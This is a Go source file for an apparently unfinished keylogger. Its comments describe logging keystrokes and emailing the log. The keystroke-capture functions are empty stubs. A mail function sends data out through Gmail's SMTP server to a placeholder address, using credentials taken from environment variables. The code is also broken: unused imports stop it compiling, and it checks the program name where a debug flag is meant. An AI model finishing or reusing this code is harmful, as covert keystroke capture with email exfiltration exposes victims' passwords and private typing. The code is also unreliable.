package main

import (
	"fmt"
	"runtime"
	"github.com/eiannone/keyboard"
	"net/smtp"
	"os"
)

func main() {
	mode_stats := os.Args[0]
	debug_mode := mode(mode_stats)
	start(debug_mode)
	// have to add concurrency to log keystrokes and mail log every
	key(debug_mode)
	// mail(debug_mode)
}

func mode(mode string) (bool) {
	var debug_mode bool = false	
	if mode == "-d" {
		debug_mode = true
	}
	return debug_mode
}

func start (debug_mode bool)() {
	// get the user to start the program
}

func key (debug_mode bool)() {
	// log the keystrokes to a file
}

func mail(debug_mode bool)() {
	// email the log to a email

	 
    // from is senders email address
     
    // we used environment variables to load the
    // email address and the password from the shell
    // you can also directly assign the email address
    // and the password
    from := os.Getenv("MAIL")
    password := os.Getenv("PASSWD")
 
    // toList is list of email address that email is to be sent.
    toList := []string{"example@gmail.com"}
 
    // host is address of server that the
    // sender's email address belongs,
    // in this case its gmail.
    // For e.g if your are using yahoo
    // mail change the address as smtp.mail.yahoo.com
    host := "smtp.gmail.com"
 
    // default port of smtp server
    port := "587"
 
    // This is the message to send in the mail
	// needs to be set to the log file
    msg := ""
    body := []byte(msg)
 
    auth := smtp.PlainAuth("", from, password, host)
 
    err := smtp.SendMail(host+":"+port, auth, from, toList, body)
 
    // handling the errors
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }
 
	if debug_mode == true {
		fmt.Println("Sent")
	}
}
